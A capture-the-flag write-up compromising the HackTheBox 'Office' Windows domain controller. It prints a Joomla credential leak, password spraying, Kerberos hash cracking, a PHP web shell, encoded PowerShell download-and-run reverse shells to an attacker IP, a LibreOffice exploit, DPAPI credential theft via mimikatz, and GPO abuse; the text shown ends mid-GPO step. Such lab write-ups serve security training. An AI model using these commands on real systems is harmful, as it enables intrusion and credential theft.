---
title: "HackTheBox - Office"
author: Nasrallah
description: ""
date: 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, hard, dpapi, gpo, smb, cve, rce, chisel, kerberos, hashcat]
img_path: /assets/img/hackthebox/machines/office
image:
    path: office.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

On [Office](https://app.hackthebox.com/machines/office) we begin by exploiting an information disclosure in Joomla to get a password, we get a list of usernames with `kerbrute` and perform password spray for valid credentials. We get access to a share that has a pcap file, we analyze it and extract hash and crack it. With the new password we login to joomla and get a shell. We find a website running locally, we forward it and exploit a file upload and libre office for a new user. The latter has stored DPAPI credentials, using mimikatz we extract new credentials of a user who can edit GPO allowing us to get administrator access.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 18:11 +01
Nmap scan report for 10.10.11.3                                                                
Host is up (0.13s latency).            
Not shown: 988 filtered tcp ports (no-response) 
PORT     STATE SERVICE       VERSION                                                           
53/tcp   open  domain        Simple DNS Plus                   
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Home                                                                             
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries (15 shown)                
| /joomla/administrator/ /administrator/ /api/ /bin/           
| /cache/ /cli/ /components/ /includes/ /installation/             
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-29 01:12:12Z)  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-29T01:13:37+00:00; +8h00m01s from scanner time.                 
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn:  
|_  http/1.1                 
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47                                                        
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28                         
|_ssl-date: TLS randomness does not represent time           
|_http-title: 403 Forbidden
445/tcp  open  microsoft-ds? 
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2025-07-29T01:13:36+00:00; +8h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2025-07-29T01:13:37+00:00; +8h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-29T01:13:36+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-29T01:12:57
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s

```

The target is a windows machine, specifically an active directory domain controller with the domain name `office.htb` and DC `DC.office.htb`.

We see that ports 80 and 443 are open.

Nmap also tells us that port 80 is running `joomla`.

### Web

Let's start with web enumeration.

![webpage](1.png)

This looks like a blog.

Since the website is using `Joomla`, let's run the `joomscan` tool and see what we find.

```terminal
    ____  _____  _____  __  __  ___   ___    __    _  _        
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )       
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (        
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)       
                        (1337.today)     
                 
    --=[OWASP JoomScan           
    +---++---==[Version : 0.0.7  
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge       
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP          
                 
Processing http://10.10.11.3/ ...

[+] FireWall Detector            
[++] Firewall not detected       
                 
[+] Detecting Joomla Version     
[++] Joomla 4.2.7
                 
[+] Core Joomla Vulnerability    
[++] Target Joomla core is not vulnerable
                 
[+] Checking Directory Listing   
[++] directory has directory listing :   
http://10.10.11.3/administrator/components
http://10.10.11.3/administrator/modules  
http://10.10.11.3/administrator/templates
http://10.10.11.3/images/banners          
```

The version running is `Joomla 4.2.7`, a quick search on google we find that this version is vulnerable to information disclosure [CVE-2023-23752](https://www.cvedetails.com/cve/CVE-2023-23752/).

This vulnerability allows us to retrieve database credentials by requesting the `/api/index.php/v1/config/application?public=true` endpoint.

```terminal
curl http://10.10.11.3/api/index.php/v1/config/application?public=true 
{"links":{"self":"http:\/\/10.10.11.3\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/10.10.11.3\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/10.10.11.3\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Holography Industries","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"root","id":224}},{"type":"application","id":"224","attributes":{"password":"H0lOgrams4reTakIng0Ver754!","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla_db","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"if2tx_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}  
```

After some formatting we find the following mysql credentials.

```json
{
    "type": "application",
  "id": "224",
  "attributes": {
    "user": "root",
    "id": 224
  }
},
{
  "type": "application",
  "id": "224",
  "attributes": {
    "password": "H0lOgrams4reTakIng0Ver754!",
    "id": 224
  }
},
```

I tried login in on joomla but that failed!

#### Kerbrute

Let's run kerbrute to get a list of valid usernames.

```terminal
[★]$ kerbrute userenum -d office.htb --dc 10.10.11.3 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt                                                                      
                                                              
    __             __               __                        
   / /_____  _____/ /_  _______  __/ /____                    
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \                   
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/                   
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                    
                                                              
Version: v1.0.3 (9dad6e1) - 07/28/25 - Ronnie Flathers @ropnop
                                                              
2025/07/28 19:28:25 >  Using KDC(s):                          
2025/07/28 19:28:25 >   10.10.11.3:88                         
                                                              
2025/07/28 19:29:00 >  [+] VALID USERNAME:     administrator@office.htb
2025/07/28 19:29:00 >  [+] VALID USERNAME:     etower@office.htb
2025/07/28 19:29:00 >  [+] VALID USERNAME:     ewhite@office.htb
2025/07/28 19:29:00 >  [+] VALID USERNAME:     dwolfe@office.htb
2025/07/28 19:29:00 >  [+] VALID USERNAME:     dmichael@office.htb
2025/07/28 19:29:00 >  [+] VALID USERNAME:     dlanor@office.htb
```

We got a list of usernames, let's run a password spray against smb.

```terminal
┌──[10.10.16.18]-[venv]-[sirius💀parrot]-[25-07-28 19:33]-[~/ctf/htb/office]
└──╼[★]$ nxc smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\tstark:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

Great! User `dwolfe` is using the same password.

### SMB

Let's list shares.

```terminal
┌──[10.10.16.18]-[venv]-[sirius💀parrot]-[25-07-28 19:34]-[~/ctf/htb/office]
└──╼[★]$ nxc smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ            
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
```

The is a share called `SOC Analysis`, let's connect to it and see what's there.

```terminal
┌──[10.10.16.18]-[venv]-[sirius💀parrot]-[25-07-28 19:40]-[~/ctf/htb/office]
└──╼[★]$ smbclient //10.10.11.3/'SOC Analysis' -U dwolfe%'H0lOgrams4reTakIng0Ver754!'                                                                                                         
Try "help" to get a list of possible commands.                              
smb: \> ls                                                                  
  .                                   D        0  Wed May 10 19:52:24 2023  
  ..                                DHS        0  Wed Feb 14 11:18:31 2024  
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 01:59:00 2023

                6265599 blocks of size 4096. 1258632 blocks available                 
smb: \> get Latest-System-Dump-8fbc124d.pcap                                                   
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (164.4 KiloBytes/sec) (average 164.4 KiloBytes/sec)
```

We found a pcap file, let's inspect it on `wireshark`.

![wireshark](2.png)

After some digging we find kerberos pre-authentication packet.

The following article explains how we can construct a crackable hash from the packets <https://web.archive.org/web/20230608022006/https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/>.

We go to packet details and select `kerberos` -> `as-req` -> `padata` -> `PA-DATA TIMESTAMP` -> `type` -. `value` and we copy the cipher.

We prefix the cipher with `$krb5pa$18$tstark$OFFICE.HTB$` and now we have a hash we can crack.

```terminal
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
```

We can use hashcat mode 19900.

```terminal
λ .\hashcat.exe hashes.txt rockyou.txt -m 19900
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c56...86f5fc
Time.Started.....: Mon Jul 28 19:08:43 2025 (4 secs)
Time.Estimated...: Mon Jul 28 19:08:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    26267 H/s (9.96ms) @ Accel:8 Loops:16 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 98304/14344384 (0.69%)
Rejected.........: 0/98304 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4095
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> Dominic1

Started: Mon Jul 28 19:08:39 2025
Stopped: Mon Jul 28 19:08:49 2025
```

We got the password `playboy69`.

Looking back at the packet, we see that this pre-authentication belongs to user `tstark`.

![tstark](3.png)

Let's try the password.

```terminal
nxc ldap 10.10.11.3 -u tstark -p 'playboy69'
LDAP        10.10.11.3      389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.10.11.3      389    DC               [+] office.htb\tstark:playboy69 
```

The password works, but we don't have winrm access to get a shell.

Let's go back to joomla and login as `administrator` with `playboy69` password.

![admin](5.png)

## **Foothold**

### Joomla

To get a shell we can edit a template.

We select `System` -> `Site Templates` and we can see a template called `Cassiopeia`.

![ca](6.png)

We click on it and select the `error.php` file to edit.

We add a simple php web shell.

```php
system($_GET['cmd']);
```

![shell](4.png)

We click on save and then request the error page with cmd parameter to execute commands.

```terminal
[★]$ curl -s http://10.10.11.3/templates/cassiopeia/error.php?cmd=whoami
office\web_account
```

For a reverse shell, I'll use `nishang`'s `Invoke-PowerShellTcp.ps1` script and add the following line at the end to be executed automatically.

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.18 -Port 9001
```

And I'll server the file using python http server.

Now I'm going to request the file using the following command.

```terminal
IEX(New-Object Net.WebClient).downloadString("http://10.14.91.207/shell.ps1")
```

But I'll encode it with little endian then base64.

```bash
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.18/shell.ps1")' | iconv -t utf-16le | base64 -w 0;echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==
```

Now on the website I'll run.

```powershell
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQAKAA==
```

We setup a listener and run the command and should get a shell.

```terminal
┌──[10.10.16.18]-[venv]-[sirius💀parrot]-[25-07-28 20:43]-[~/ctf/htb/office]                                                                                                                  
└──╼[★]$ rlwrap nc -lvnp 9001                       
Listening on 0.0.0.0 9001                           
Connection received on 10.10.11.3 56037             
Windows PowerShell running as user web_account on DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
        
whoami^M
office\web_account
```

The shell is a bit weird, I have to press enter two times for the command to run. Since we have the creds for `tstark` user, let's escalate to him anyways and get a better shell.

## **Privilege Escalation**

### Web_account -> tstark

I'll upload a copy of `RunAsCS.exe` and give it tstark credentials and my ip and port.

```powershell
.\runas.exe tstark playboy69 powershell.exe -r 10.10.16.18:900
```

```terminal
[★]$ rlwrap nc -lvnp 9002 
Listening on 0.0.0.0 9002     
Connection received on 10.10.11.3 56076
Windows PowerShell            
Copyright (C) Microsoft Corporation. All rights reserved.
                              
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
                              
PS C:\Windows\system32> whoami
whoami                        
office\tstark   
```

### tstark -> ppotts

Checking `program files` I notice that libre office is installed.

```terminal
ls c:\progra~1                                        
                                                      
                                                      
    Directory: C:\Program Files                       
                                                      
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/22/2024   9:58 AM                Common Files
d-----         1/25/2024  12:20 PM                Internet Explorer
d-----         1/17/2024   1:26 PM                LibreOffice 5 
```

Listing open ports with `netstat -ano` shows port 8083:

```terminal
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4868
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4868
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       684
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       768
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       368
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING       4868  
```

Let's forward it using `chisel.

First we setup a server on our linux machine

```terminal
./chisel server --reverse --port 9003
2025/07/28 21:18:50 server: Reverse tunnelling enabled
2025/07/28 21:18:50 server: Fingerprint ni14xyA4t1c/dDVyE5MFYXMVgSfhOWd+ctRNIKQ8Ook=
2025/07/28 21:18:50 server: Listening on http://0.0.0.0:9003
```

Now we upload chisel.exe to the target and run the following command to forward the port.

```terminal
.\chisel.exe client 10.10.16.18:9003 R:8083:127.0.0.1:8083
```

Now we can navigate to `127.0.0.1:8083` to access the port.

![internal](7.png)

We can see a submit applications tab, let's check it.

![rs](8.png)

Here we can upload resumes, I tried uploading a pdf file but got an error telling us what file types we can upload, among those there is odt which is used by libre office!

Since I found libre office 5 on the program files earlier I searched for exploits on google and found the following vulnerability [CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255) that allows an attacker to craft malicious odt file that can lead to remote code execution.

We can use this [exploit](https://github.com/elweth-sec/CVE-2023-2255) to craft the file.

I'll use powershell base64 from `revshells.com`

```terminal
python CVE-2023-2255.py --cmd 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA4ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
File output.odt has been created !
```

Now we upload the file to the target using the form and wait on our listener.

```terminal
┌──[10.10.16.18]-[sirius💀parrot]-[25-07-28 22:21]-[~]                                         
└──╼[★]$ rlwrap nc -lvnp 9999                    
Listening on 0.0.0.0 9999                        
Connection received on 10.10.11.3 56684          
                                                 
PS C:\Program Files\LibreOffice 5\program> whoami
office\ppotts
```

### ppotts -> hhogan

Doing some manual enumeration I came across DPAPI credentials files.

```terminal
PS C:\users\ppotts\appdata\roaming\microsoft> ls credentials -force


    Directory: C:\users\ppotts\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E                                      
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4                                      
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
```

We can also find keys.

```terminal
PS C:\users\ppotts\appdata\roaming\microsoft> ls protect/S-1-5-21-1199398058-4196589450-691661856-1107 -force


    Directory: C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d                                  
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb                                  
-a-hs-         7/28/2025   6:08 PM            740 3a9fdd9c-499e-4a64-ba16-36e6552f777b                                  
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE                                                             
-a-hs-         7/28/2025   6:08 PM             24 Preferred 
```

I'll start an smb server on my machine and start transferring files.

```terminal
smbserver.py share -smb2support ./ -user sirius -password sirius
```

```terminal
PS C:\users\ppotts\appdata\roaming\microsoft\Credentials> net use \\10.10.16.18\share /user:sirius sirius
The command completed successfully.

PS C:\users\ppotts\appdata\roaming\microsoft\Credentials> copy 18A1927A997A794B65E9849883AC3F3E \\10.10.16.18\share
PS C:\users\ppotts\appdata\roaming\microsoft\Credentials> copy 84F1CAEEBF466550F4967858F9353FB4 \\10.10.16.18\share
PS C:\users\ppotts\appdata\roaming\microsoft\Credentials> copy E76CCA3670CD9BB98DF79E0A8D176F1E \\10.10.16.18\share
```

Since we don't have any credentials, let's use mimikatz with `rpc` to decrypt they key.

```terminal
.\mimi.exe "dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c4
7eb /rpc" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

[SNIP]

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```

We got the key, now let's decrypt the credential files.

```terminal
[★]$ dpapi.py credential -f 84F1CAEEBF466550F4967858F9353FB4 -key 0x87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2023-05-09 23:03:21
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:interactive=OFFICE\HHogan
Description : 
Unknown     : 
Username    : OFFICE\HHogan
Unknown     : H4ppyFtW183#

```

We got the password of HHogan, let's winrm to the box.

```terminal
[★]$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami /all              

USER INFORMATION
----------------       
                                               
User Name     SID
============= =============================================
office\hhogan S-1-5-21-1199398058-4196589450-691661856-1108
                                                                                               
                                                                                               
GROUP INFORMATION                                                                              
-----------------
                                                                                               
Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448   
```

### hhogan -> administrator

We see that hhogan is part of GPO Managers group, I ran bloodhound earlier and found the following.

![bloo](9.png)

We can edit the `Default Domain Policy`.

For that we can use a tool called [SharpGPOAbuse.exe](https://github.com/FSecureLABS/SharpGPOAbuse) to add our user to administrators group.

```terminal
*Evil-WinRM* PS C:\Users\HHogan\Documents> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "Default Domain Policy"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of hhogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
